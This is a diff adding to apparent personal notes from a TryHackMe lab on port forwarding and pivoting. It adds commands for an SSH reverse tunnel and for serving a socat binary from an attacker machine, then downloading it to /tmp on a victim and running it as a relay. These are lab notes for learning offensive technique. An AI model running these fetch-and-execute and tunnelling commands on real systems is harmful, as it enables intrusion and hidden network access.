@@ -278,7 +278,41 @@ Read more about port forwarding here: [fumenoid.github.io/posts/port-forwarding]
 **Victim**
 
 ```
-f
+ss -ltp
+```
+
+<figure><img src="../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## try later
+
+**Kali**
+
+```
+ssh tunneluser@ServerA -R 8888:thmdc.za.tryhackme.com:80
+```
+
+## or maybe this
+
+**Kali**
+
+Copy
+
+```
+wget https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+Copy
+
+```
+cd /tmp
+wget http://$KALI:81/socat-linux-amd64
+chmod +x socat-linux-amd64 
+./socat-linux-amd64  tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
 ```
 
 ## Unit 5 - Automating scripts
